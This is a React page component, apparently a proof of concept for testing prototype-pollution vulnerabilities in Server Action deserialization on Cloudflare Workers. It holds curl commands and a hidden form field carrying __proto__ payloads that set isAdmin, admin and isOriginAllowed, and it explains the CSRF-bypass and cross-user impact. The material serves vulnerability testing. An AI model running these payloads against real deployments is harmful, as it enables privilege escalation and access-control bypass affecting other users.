import { testPrototypePollution, checkPrototypePollution } from './actions';

export default function TestPollutionPage() {
  return (
    <div style={{ padding: '2rem', fontFamily: 'system-ui', maxWidth: '1000px', margin: '0 auto' }}>
      <h1>Prototype Pollution Test - Isolate Takeover PoC</h1>
      <p style={{ background: '#ffcccc', padding: '1rem', borderRadius: '8px', border: '1px solid #ff0000' }}>
        <strong>⚠️ CRITICAL SECURITY TEST:</strong> This tests if Server Action argument 
        deserialization is vulnerable to persistent prototype pollution at the V8 Isolate level.
      </p>
      
      <div style={{ background: '#f5f5f5', padding: '1.5rem', borderRadius: '8px', marginTop: '2rem' }}>
        <h2>How to Test</h2>
        <h3>Method 1: Using the Form (Interactive)</h3>
        <ol style={{ lineHeight: '1.8' }}>
          <li>
            <strong>Step 1: Check Baseline</strong>
            <br/>
            Click "Check Prototype Status" to see current state (should be clean)
          </li>
          <li>
            <strong>Step 2: Send Pollution Payload</strong>
            <br/>
            Use curl to send pollution payload:
            <pre style={{ background: '#1e1e1e', color: '#d4d4d4', padding: '1rem', borderRadius: '4px', overflow: 'auto', fontSize: '12px' }}>
{`curl -X POST 'https://YOUR-WORKER.workers.dev/' \\
  -H 'x-rsc-action: testPrototypePollution' \\
  -H 'Content-Type: application/json' \\
  -d '{
    "__proto__": {
      "isAdmin": true,
      "polluted": "ATTACKER_WAS_HERE",
      "admin": true,
      "isOriginAllowed": true
    }
  }'`}
            </pre>
          </li>
          <li>
            <strong>Step 3: Verify Persistence</strong>
            <br/>
            Click "Check Prototype Status" again - if polluted, values will show TRUE
          </li>
          <li>
            <strong>Step 4: Test from Different Browser</strong>
            <br/>
            Open in incognito/different browser and check again
            <br/>
            If STILL polluted = ISOLATE TAKEOVER (CRITICAL!)
          </li>
        </ol>
        
        <h3>Method 2: Using curl (Automated)</h3>
        <pre style={{ background: '#1e1e1e', color: '#d4d4d4', padding: '1rem', borderRadius: '4px', overflow: 'auto', fontSize: '12px' }}>
{`# Check baseline
curl -X POST 'https://YOUR-WORKER.workers.dev/' \\
  -H 'x-rsc-action: checkPrototypePollution' \\
  -H 'Content-Type: application/json' \\
  -d '{}'

# Send pollution payload
curl -X POST 'https://YOUR-WORKER.workers.dev/' \\
  -H 'x-rsc-action: testPrototypePollution' \\
  -H 'Content-Type: application/json' \\
  -d '{
    "__proto__": {
      "isAdmin": true,
      "polluted": "ATTACKER_WAS_HERE_'"$(date +%s)"'",
      "admin": true,
      "isOriginAllowed": true
    }
  }'

# Check if pollution persisted
curl -X POST 'https://YOUR-WORKER.workers.dev/' \\
  -H 'x-rsc-action: checkPrototypePollution' \\
  -H 'Content-Type: application/json' \\
  -d '{}'`}
        </pre>
      </div>
      
      <div style={{ background: '#d1ecf1', padding: '1.5rem', borderRadius: '8px', marginTop: '2rem', border: '1px solid #00acc1' }}>
        <h2>Expected Results</h2>
        <h3>If VULNERABLE (CRITICAL - CVSS 9.0+):</h3>
        <ul>
          <li>After sending payload: <code>pollutionDetected.hasIsAdmin = true</code></li>
          <li>On subsequent checks: <code>hasIsAdmin = true</code> (PERSISTED!)</li>
          <li>From different browser: <code>hasIsAdmin = true</code> (ISOLATE TAKEOVER!)</li>
        </ul>
        <h3>If SECURE:</h3>
        <ul>
          <li>All checks return: <code>hasIsAdmin = false</code></li>
          <li>No pollution detected</li>
          <li>No persistence across requests</li>
        </ul>
      </div>
      
      <div style={{ background: '#fff3cd', padding: '1.5rem', borderRadius: '8px', marginTop: '2rem', border: '1px solid #ffc107' }}>
        <h2>Why This Matters</h2>
        <p>
          Cloudflare Workers use <strong>V8 Isolates</strong> that are <strong>reused</strong> between requests.
          If <code>decodeReply()</code> (from react-server-dom-webpack) doesn't protect against <code>__proto__</code> injection:
        </p>
        <ul>
          <li><strong>Persistent:</strong> Pollution survives across requests (warm isolate)</li>
          <li><strong>Isolate-level:</strong> Affects ALL users in same isolate</li>
          <li><strong>Not session-based:</strong> Inherits via prototype chain</li>
          <li><strong>Isolate Takeover:</strong> Can modify router behavior, Request/Response objects</li>
          <li><strong>CSRF Bypass:</strong> If <code>isOriginAllowed</code> is polluted to <code>true</code></li>
        </ul>
      </div>
      
      <div style={{ marginTop: '2rem', padding: '1rem', background: '#e8f5e9', borderRadius: '8px', border: '1px solid #4caf50' }}>
        <h2>Test Actions</h2>
        <form action={checkPrototypePollution} style={{ marginBottom: '1rem' }}>
          <button type="submit" style={{ padding: '0.5rem 1rem', fontSize: '1rem', cursor: 'pointer' }}>
            Check Prototype Status
          </button>
        </form>
        <form action={testPrototypePollution} style={{ marginBottom: '1rem' }}>
          <input 
            type="hidden" 
            name="data" 
            value='{"__proto__": {"isAdmin": true, "polluted": "FORM_TEST"}}'
          />
          <button type="submit" style={{ padding: '0.5rem 1rem', fontSize: '1rem', cursor: 'pointer', background: '#ffcccc' }}>
            Test Pollution (via Form)
          </button>
        </form>
      </div>
    </div>
  );
}
